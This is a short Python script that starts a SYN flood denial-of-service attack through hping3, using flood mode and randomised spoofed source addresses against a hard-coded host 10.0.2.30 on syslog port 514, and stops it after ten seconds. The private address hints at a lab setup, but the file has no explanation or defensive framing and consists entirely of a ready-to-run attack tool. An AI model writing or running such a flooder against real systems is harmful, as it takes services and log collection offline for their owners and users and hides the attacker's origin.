import subprocess
import time

def start_dos_attack(target_ip, target_port):
    """
    Starts a SYN flood attack using hping3.
    """
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    command = [
        "hping3",
        "-S",
        "-p",
        str(target_port),
        "--flood",
        "--rand-source",
        target_ip,
    ]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("DoS attack started.")
    return process

def stop_dos_attack(process):
    """
    Stops the hping3 process.
    """
    print("Stopping DoS attack...")
    process.terminate()
    process.wait()
    print("DoS attack stopped.")

if __name__ == "__main__":
    target_ip = "10.0.2.30"
    target_port = 514
    
    process = start_dos_attack(target_ip, target_port)
    try:
        # Keep the attack running for a while
        time.sleep(10)
    finally:
        stop_dos_attack(process)
